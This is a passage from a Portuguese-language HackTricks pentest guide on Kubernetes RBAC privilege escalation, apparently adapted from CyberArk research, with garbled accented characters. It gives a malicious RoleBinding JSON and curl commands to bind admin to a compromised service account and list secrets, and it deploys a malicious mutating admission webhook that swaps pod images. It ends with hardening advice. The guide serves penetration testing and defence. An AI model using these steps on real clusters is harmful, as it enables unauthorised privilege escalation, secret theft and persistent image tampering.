![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

Tamb√©m existe uma fun√ß√£o existente chamada _list-pods_. Qualquer pessoa com essa fun√ß√£o pode listar todos os pods no namespace _default_. O usu√°rio _sa7_ deve ter permiss√µes para editar qualquer fun√ß√£o, ent√£o vamos ver o que acontece quando ele tenta adicionar o recurso "secrets" aos recursos da fun√ß√£o.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

Ap√≥s tentar fazer isso, receberemos um erro "forbidden: attempt to grant extra privileges" (Figura 31), porque embora nosso usu√°rio _sa7_ tenha permiss√µes para atualizar fun√ß√µes para qualquer recurso, ele s√≥ pode atualizar a fun√ß√£o para recursos nos quais ele tenha permiss√µes.

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Obter e Modificar RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Aparentemente essa t√©cnica funcionava antes, mas de acordo com meus testes, n√£o est√° mais funcionando pelo mesmo motivo explicado na se√ß√£o anterior. Voc√™ n√£o pode criar/modificar um rolebinding para conceder a si mesmo ou a outro SA algumas permiss√µes se voc√™ n√£o as tiver previamente.**
{% endhint %}

O privil√©gio de criar Rolebindings permite que um usu√°rio **vincule fun√ß√µes a uma conta de servi√ßo**. Esse privil√©gio pode levar a escalonamento de privil√©gios, pois **permite que o usu√°rio vincule privil√©gios de administrador a uma conta de servi√ßo comprometida.**

O seguinte ClusterRole est√° usando o verbo especial _bind_ que permite que um usu√°rio crie um RoleBinding com o ClusterRole _admin_ (fun√ß√£o de alto privil√©gio padr√£o) e adicione qualquer usu√°rio, incluindo ele mesmo, a esse ClusterRole de administrador.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

Ent√£o √© poss√≠vel criar **`malicious-RoleBinging.json`**, que **vincula a fun√ß√£o de administrador a outra conta de servi√ßo comprometida:**
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
O objetivo deste arquivo JSON √© vincular o "ClusterRole" de administrador (linha 11) √† conta de servi√ßo comprometida (linha 16).

Agora, tudo o que precisamos fazer √© enviar nosso JSON como uma solicita√ß√£o POST para a API usando o seguinte comando CURL:
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
Depois que a fun√ß√£o de administrador √© vinculada √† conta de servi√ßo "compromised-svc", podemos usar o token da conta de servi√ßo comprometida para listar segredos. O comando CURL a seguir far√° isso:
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## Outros Ataques

### Aplicativo de proxy sidecar

Por padr√£o, n√£o h√° criptografia na comunica√ß√£o entre os pods. Autentica√ß√£o m√∫tua, bidirecional, pod para pod.

#### Crie um aplicativo de proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crie seu arquivo .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edite seu arquivo .yaml e adicione as linhas descomentadas:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Veja os logs do proxy:
```bash
kubectl logs app -C proxy
```
Mais informa√ß√µes em: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de Admiss√£o Malicioso

Um controlador de admiss√£o √© um trecho de c√≥digo que **intercepta solicita√ß√µes para o servidor de API do Kubernetes** antes da persist√™ncia do objeto, mas **ap√≥s a solicita√ß√£o ser autenticada** **e autorizada**.

Se um invasor de alguma forma conseguir **injetar um Controlador de Admiss√£o de Muta√ß√£o**, ele ser√° capaz de **modificar solicita√ß√µes j√° autenticadas**. Isso pode permitir a escalada de privil√©gios e, mais comumente, a persist√™ncia no cluster.

Exemplo de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Aguarde at√© que o servidor de webhook esteja pronto. Verifique o status:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Depois de termos nosso webhook de muta√ß√£o malicioso em execu√ß√£o, vamos implantar um novo pod.
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Espere novamente, at√© ver a mudan√ßa no status do pod. Agora, voc√™ pode ver o erro `ErrImagePull`. Verifique o nome da imagem com qualquer uma das consultas.
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como voc√™ pode ver na imagem acima, tentamos executar a imagem `nginx`, mas a imagem executada final √© `rewanthtammana/malicious-image`. O que acabou de acontecer!!?

#### Aspectos t√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>

Vamos explicar o que acabou de acontecer. O script `./deploy.sh` que voc√™ executou criou um controlador de admiss√£o de webhook mutante. As linhas abaixo no controlador de admiss√£o de webhook mutante s√£o respons√°veis pelos resultados acima.
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
O trecho acima substitui a primeira imagem do container em cada pod por `rewanthtammana/malicious-image`.

## Melhores Pr√°ticas

### **Impedir a montagem autom√°tica de tokens de conta de servi√ßo em pods**

Ao criar um pod, ele automaticamente monta uma conta de servi√ßo (a padr√£o √© a conta de servi√ßo padr√£o no mesmo namespace). Nem todo pod precisa ter a capacidade de utilizar a API de dentro de si mesmo.

A partir da vers√£o 1.6+, √© poss√≠vel impedir a montagem autom√°tica de tokens de conta de servi√ßo em pods usando automountServiceAccountToken: false. Isso pode ser usado em contas de servi√ßo ou pods.

Em uma conta de servi√ßo, deve ser adicionado da seguinte forma:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

Tamb√©m √© poss√≠vel us√°-lo no pod:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **Conceder permiss√µes espec√≠ficas a usu√°rios em RoleBindings\ClusterRoleBindings**

Ao criar RoleBindings\ClusterRoleBindings, certifique-se de que apenas os usu√°rios que precisam da fun√ß√£o na associa√ß√£o estejam inclu√≠dos. √â f√°cil esquecer usu√°rios que n√£o s√£o mais relevantes dentro desses grupos.

### **Usar Roles e RoleBindings em vez de ClusterRoles e ClusterRoleBindings**

Ao usar ClusterRoles e ClusterRoleBindings, eles se aplicam a todo o cluster. Um usu√°rio nesse grupo tem permiss√µes sobre todos os namespaces, o que √†s vezes √© desnecess√°rio. Roles e RoleBindings podem ser aplicados em um namespace espec√≠fico e fornecer outra camada de seguran√ßa.

### **Usar ferramentas automatizadas**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Refer√™ncias**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
